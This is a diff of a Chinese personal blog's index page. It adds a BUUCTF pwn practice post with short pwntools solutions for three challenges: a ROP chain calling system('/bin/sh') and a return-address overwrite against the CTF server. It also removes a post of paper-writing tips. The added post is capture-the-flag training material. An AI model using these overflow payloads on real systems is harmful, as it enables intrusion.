@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 38
+                                               总文章数 39
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">65.5k</span>
+	总字数 <span class="post-count">66k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -157,6 +157,91 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-buuctf-pwn刷题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：122字 | 预计阅读时长：1分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/">buuctf-pwn刷题</a>
+    </h1>
+  
+
+        
+        <a href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/" class="archive-article-date">
+  	<time datetime="2023-09-15T08:55:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>1、test_your_nc</p>
+<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230917175722461.png" alt="image-20230917175722461"></p>
+<p>题解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28839</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2、rip</p>
+<p>直接溢出，注意栈平衡</p>
+<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165950595.png" alt="image-20230918165950595"></p>
+<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918165959788.png" alt="image-20230918165959788"></p>
+<p>题解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26953</span>)</span><br><span class="line">system_addr = <span class="number">0x401040</span></span><br><span class="line">bin_addr = <span class="number">0x40201B</span> </span><br><span class="line">pop_rdi = <span class="number">0x4011fb</span></span><br><span class="line">ret_addr = <span class="number">0x401198</span></span><br><span class="line">call_system = <span class="number">0x401187</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>  + p64(ret_addr) + p64(pop_rdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>绕了一下，不过差不多。</p>
+<p>3、warmup_csaw_2016</p>
+<p>给了system函数，直接gets溢出</p>
+<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170608714.png" alt="image-20230918170608714"></p>
+<p><img src="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/Users\26645\AppData\Roaming\Typora\typora-user-images\image-20230918170616415.png" alt="image-20230918170616415"></p>
+<p>题解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./warmup&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29760</span>)</span><br><span class="line">sys_addr = <span class="number">0x40060D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/09/15/buuctf-pwn%E5%88%B7%E9%A2%98/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
     <article id="post-报告第二篇How-to-Do-Great-Research" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -1155,166 +1240,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2023/07/18/Exercise-6-GIMP/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-论文写作第一篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：3.1k字 | 预计阅读时长：10分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/07/16/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%AC%AC%E4%B8%80%E7%AF%87/">论文写作第一篇</a>
-    </h1>
-  
-
-        
-        <a href="/2023/07/16/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%AC%AC%E4%B8%80%E7%AF%87/" class="archive-article-date">
-  	<time datetime="2023-07-16T03:30:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-07-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Tips for Writing Technical Papers </p>
-<p><a target="_blank" rel="noopener" href="http://infolab.stanford.edu/~widom">Jennifer Widom</a>, January 2006 </p>
-<h2 id="1、运行示例"><a href="#1、运行示例" class="headerlink" title="1、运行示例"></a>1、运行示例</h2><p>给定一个虚构的运行示例，假设你设计并进行了一系列实验，测试了一种新的外部多趟归并排序算法。该算法通过接受一定程度的有限的“未排序数据”，将复杂度从O(n log n)降低到O(n)。你计划将实验结果撰写成论文，准备提交给一个重要的学术会议。</p>
-<h2 id="2、论文题目"><a href="#2、论文题目" class="headerlink" title="2、论文题目"></a>2、论文题目</h2><ul>
-<li>标题可以很长、具体描述：</li>
-</ul>
-<p>​      具有近似保证的线性时间外部多路径排序</p>
-<ul>
-<li>或简短而精炼：</li>
-</ul>
-<p>​     近似外部排序</p>
-<ul>
-<li>这是一条中等长度的名字，加上一个让人印象深刻的名字：</li>
-</ul>
-<p>​      Floosh：一个线性时间的算法用于近似外部排序</p>
-<h2 id="3、摘要"><a href="#3、摘要" class="headerlink" title="3、摘要"></a>3、摘要</h2><p>说明问题、你的方法和解决方案、以及论文的主要贡献。几乎不包括背景和动机。实事求是，但要全面。摘要中的材料以后不应在论文中逐字逐句地重复。  </p>
-<h2 id="4、引言"><a href="#4、引言" class="headerlink" title="4、引言"></a>4、引言</h2><p>引言至关重要。当评委读完引言时，他们可能已经做出了接受还是拒绝论文的初步决定——他们会阅读论文的其余部分，寻找支持他们决定的证据。如果引言吸引了普通读者，他们会继续阅读，否则会把论文放在一边。  </p>
-<p>以下是斯坦福信息实验室的专利五点结构介绍。除非有充分的论据反对，否则引言应由五段组成，回答以下五个问题：  </p>
-<p>1.问题出在哪里？</p>
-<p>2.为什么它有趣又重要？</p>
-<p>3.为什么这么难？（例如，为什么简单的方法会失败？）</p>
-<p>4.为什么以前没有解决？（或者，之前提出的解决方案有什么问题？我的解决方案有何不同？）</p>
-<p>5.我的方法和结果的关键组成部分是什么？还包括任何具体限制。</p>
-<p>6.然后有最后一段或小节：”Summary of Contributions” 是一段总结性的内容，列出了主要贡献，并提及它们可以在哪些部分找到。这部分内容同时也可以作为整篇论文的大纲，节省空间并消除冗余。</p>
-<p>这段内容的目的是概括地回顾论文中的主要贡献，并指出它们在哪些部分详细讨论。通过这种方式，读者可以在阅读该段落时获得对整篇论文的快速了解。</p>
-<h2 id="5、相关工作"><a href="#5、相关工作" class="headerlink" title="5、相关工作"></a>5、相关工作</h2><p>相关工作应该放置在开头还是结尾：</p>
-<ol>
-<li>放置在论文的开头：如果 “Related Work” 部分可以简短但足够详细，或者如果对前期工作立即采取强有力的防御立场至关重要，那么可以将其放置在论文的开头。在这种情况下，”Related Work” 可以作为引言后面的一个小节，或者作为第二章的独立部分。</li>
-<li>放置在论文的结尾：如果 “Related Work” 部分可以在论文早期（引言或基础部分）快速总结，或者如果充分的比较需要论文的技术内容，那么可以将其放置在论文的结尾。在这种情况下，”Related Work” 应出现在结论之前，可能会被放置在更一般的 “Discussion and Related Work” 章节中。</li>
-</ol>
-<h2 id="6、文章主体"><a href="#6、文章主体" class="headerlink" title="6、文章主体"></a>6、文章主体</h2><p>论文主体部分的组织结构和指导原则</p>
-<p>首先，作者提出了两条关键的指导原则：</p>
-<ol>
-<li>在论文的四分之一结束时，读者应该对一个清晰、重要的技术贡献有所了解。这意味着在论文的早期阶段，必须明确地表达出新的技术贡献。</li>
-<li>论文的每个部分都应该讲述一个故事。作者建议只关注结果本身的故事，而不是过程中的全部细节。故事应该是线性的，让读者在每一步都保持参与，并期待下一步的内容。可以将那些不太重要的中断内容放在附录中。</li>
-</ol>
-<p>除了这些指导原则，论文主体的结构会根据内容的不同而有所差异。重要组成部分包括：</p>
-<ol>
-<li>“Running Example”：如果可能的话，可以在论文中使用一个贯穿始终的运行示例。它可以作为引言的一个小节，或者作为独立的第二或第三节（取决于相关工作的位置）引入。</li>
-<li>“Preliminaries”：这部分紧随引言、可能的相关工作和&#x2F;或“Running Example”之后，介绍与技术贡献无关的符号和术语。这部分的一个重要功能是界定那些不是原创但在论文中需要提及的材料。要保持简洁，遵循指导原则1。</li>
-<li>内容：论文的核心是算法、系统描述、新的语言构造、分析等。尽可能使用“自顶向下”的描述方式：读者应该能够看到材料的发展方向，并能够跳过一些部分仍然能够理解整个内容的思路。</li>
-</ol>
-<h2 id="7、实验性能"><a href="#7、实验性能" class="headerlink" title="7、实验性能"></a>7、实验性能</h2><p>讨论了与实验性能相关的问题和考虑事项</p>
-<p>作者提出了几点思考：</p>
-<ol>
-<li>许多会议对实验性能有要求。</li>
-<li>很容易进行”无意义”或”巧合”的实验，而且很多论文都会这样做。</li>
-<li>很容易通过设计实验来展示自己的工作最佳状态，大多数论文都会这样做。</li>
-</ol>
-<p>接下来，作者提出了一些关于实验性能应该衡量的内容：</p>
-<ol>
-<li>纯运行时间。</li>
-<li>对重要参数的敏感性。</li>
-<li>在不同方面的可扩展性：数据大小、问题复杂度等。</li>
-</ol>
-<p>除此之外，作者还提到了实验性能应该显示的内容：</p>
-<ol>
-<li>绝对性能（即可接受&#x2F;可用）。</li>
-<li>相对于朴素方法的性能。</li>
-<li>相对于以前方法的性能。</li>
-<li>相对于不同提出的方法之间的性能。</li>
-</ol>
-<p>对于实验的部分，我们应尽可能的客观公正。</p>
-<h2 id="8、总结"><a href="#8、总结" class="headerlink" title="8、总结"></a>8、总结</h2><p>一般来说，一个简短的总结段落就可以了，在任何情况下，该段落都不应该简单地重复摘要或引言中的材料。在某些情况下，现在可以使最初的主张更加具体，例如，通过参考量化的绩效结果，使其更加具体和可信。</p>
-<h2 id="9、未来的工作"><a href="#9、未来的工作" class="headerlink" title="9、未来的工作"></a>9、未来的工作</h2><p>这段文字强调了展示论文对开拓新研究方向的重要性，并提供了一些关于在论文中如何表达相关信息的建议和注意事项。通过清晰地指出自己的后续工作和给出未来研究的方向，可以展示出自己的研究价值，并为其他研究人员提供潜在的研究课题。主要有两点：</p>
-<ol>
-<li>如果你正在进行后续工作，请明确表示。例如：“我们目前正在拓展算法到……等等，并且初步结果令人鼓舞。”这样的表述可以标志出你的研究领域，并显示你在该领域的进一步努力。</li>
-<li>同时，要意识到一些研究人员会在“未来工作”部分寻找研究课题。我的观点是，这并没有什么问题，可以将其视为一种赞许。考虑到这一点，你可以在未来工作的部分提出一些可能的研究方向，给其他研究人员提供思路和启发</li>
-</ol>
-<h2 id="10、鸣谢"><a href="#10、鸣谢" class="headerlink" title="10、鸣谢"></a>10、鸣谢</h2><p>在论文的致谢部分或适当的地方要表达对所有对研究有帮助的人的感激之情，并明确表明他们对研究的贡献。无论是提供有益讨论的同事、给予草稿反馈的人还是参与具体实施的人，他们的贡献都应该得到承认和感谢。</p>
-<h2 id="11、文献引用"><a href="#11、文献引用" class="headerlink" title="11、文献引用"></a>11、文献引用</h2><p>在论文中引用文献时，要确保引文完整和一致。不能仅仅从网络上随意复制不一致的BibTex（或其他格式）条目，就此结束。应该仔细检查最终的参考文献列表，并确保每个条目都正确无误。</p>
-<h2 id="12、附录"><a href="#12、附录" class="headerlink" title="12、附录"></a>12、附录</h2><p>首先，附录应该仅包含详细证明和算法等内容。附录对于篇幅过长的论文可能至关重要，但即使在其他情况下也是有用的。可以将附录视为底层细节的随机访问证明。</p>
-<p>其次，附录不应包含理解论文贡献所必需的材料。这意味着附录的内容应该是论文贡献的补充，而非必须理解主要内容的部分。</p>
-<p>最后，附录应该包含大多数读者可能不感兴趣的材料。这意味着附录可以用于展示那些仅对特定读者或对理解论文不必要的详细信息。</p>
-<p>总之附录应该具有补充论文贡献的功能对论文的整体理解不具有必要性。</p>
-<h2 id="13、语法和小规模表达问题"><a href="#13、语法和小规模表达问题" class="headerlink" title="13、语法和小规模表达问题"></a>13、语法和小规模表达问题</h2><p>在论文中像编写程序一样，所有的术语和符号（变量）在使用之前都应该被定义，并且只定义一次。全局定义应该分组放在“前言”部分；其他定义应该在第一次使用之前给出。</p>
-<p>1.避免使用 “等等”（etc.），除非剩余的项目显而易见。可接受的用法是：我们将对阶段进行编号，例如1、3、5、7等。不可接受的用法是：我们测量性能因素，例如波动性、可伸缩性等。</p>
-<p>2.永远不要说 “由于各种原因”。告诉读者具体的原因，而不是省略不提。</p>
-<p>3.避免将 “this”、”that”、”these”、”it”等词用于非指代性的用法。明确指明 “this” 指代的对象可以增强写作的清晰度。例如，我们的实验测试了几种不同的环境，算法在其中一些环境中表现良好，而在其他环境中表现不佳。这一点很重要，因为…</p>
-<p>4.斜体字用于定义或引用，而不是强调。文章应该构建得足够清晰，以便通过上下文就能提供足够的强调。</p>
-<p>5.人们经常在 “which” 和 “that” 的使用上出错。”That”用于定义性的从句，而”which”用于非定义性的从句。以下是正确使用的示例：</p>
-<p>The algorithms that are easy to implement all run in linear time.      </p>
-<p>The algorithms, which are easy to implement, all run in linear time. </p>
-<h2 id="14、技术细节"><a href="#14、技术细节" class="headerlink" title="14、技术细节"></a>14、技术细节</h2><ol>
-<li>总是在最终论文中运行拼写检查器，没有任何借口可以忽略这一点。</li>
-<li>在初稿和技术报告中，使用11号字体、大行间距、1英寸边距和单列格式。如今的会议论文通常使用小字体和紧凑的间距，这样做没有必要让非专业读者痛苦。</li>
-<li>在初稿和最终的出版版本中，图中的字体大小应该与正文部分的文字大小大致相同。</li>
-<li>表格、图表、图形和算法应该始终放置在页面或栏的顶部，而不是在正文中，除非它很小并且适合于论文的流程中。</li>
-<li>每个表格、图表、图形或算法应该出现在第一次引用它的页面上，或者在其后一页（如果LaTeX认可的话…）。</li>
-<li>在最终提交或发表论文之前，打印一次并查看一下——您可能会惊讶地发现，纸质上的效果与您最后一次运行Latex后屏幕上的效果有多么不同（即使您上次运行Latex后都没有仔细查看过）。</li>
-</ol>
-<h2 id="15、版本和发布"><a href="#15、版本和发布" class="headerlink" title="15、版本和发布"></a>15、版本和发布</h2><p>将完整论文与会议版本相结合，并确保修改完整论文时覆盖所有先前的公开版本。同时，建议在完成后尽快将论文放在网上，并进行日期标记，以作为技术报告的引用。</p>
-<p>此外，当论文仅被提交时，绝不要在上面放上会议版权声明，也绝对不要将论文引用为“提交给X会议”。当论文最终在一两年后发表于Y会议时，你只会招致尴尬。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇本章介绍了论文写作中内容和格式上需要注意的问题。</p>
-<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://cs.stanford.edu/people/widom/paper-writing.html">https://cs.stanford.edu/people/widom/paper-writing.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/07/16/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C%E7%AC%AC%E4%B8%80%E7%AF%87/">展开全文 >></a>
         </p>
       
 
